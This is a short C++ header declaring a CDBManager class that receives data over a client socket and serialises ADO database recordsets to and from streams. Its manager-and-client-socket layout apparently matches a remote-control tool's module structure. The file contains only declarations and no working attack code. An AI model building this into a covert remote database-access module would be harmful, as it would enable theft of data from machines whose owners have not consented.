
//#if !defined(AFX_SHELLMANAGER_H__CCDCEFAB_AFD9_4F2C_A633_637ECB94B6EE__INCLUDED_)
//#define AFX_SHELLMANAGER_H__CCDCEFAB_AFD9_4F2C_A633_637ECB94B6EE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

#import "C:\Program Files\Common Files\System\ado\msado15.dll" no_namespace rename("EOF","rsEOF")

class CDBManager : public CManager
{
public:
	CDBManager(CClientSocket *pClient);
	virtual ~CDBManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	HRESULT SaveRS(_RecordsetPtr pRS/*IN*/, IStream* * ppStream/*OUT*/);
	HRESULT LoadRS(_Recordset* *ppRS/*OUT*/, IStreamPtr pStream/*IN*/);


};

//#endif // !defined(AFX_SHELLMANAGER_H__CCDCEFAB_AFD9_4F2C_A633_637ECB94B6EE__INCLUDED_)
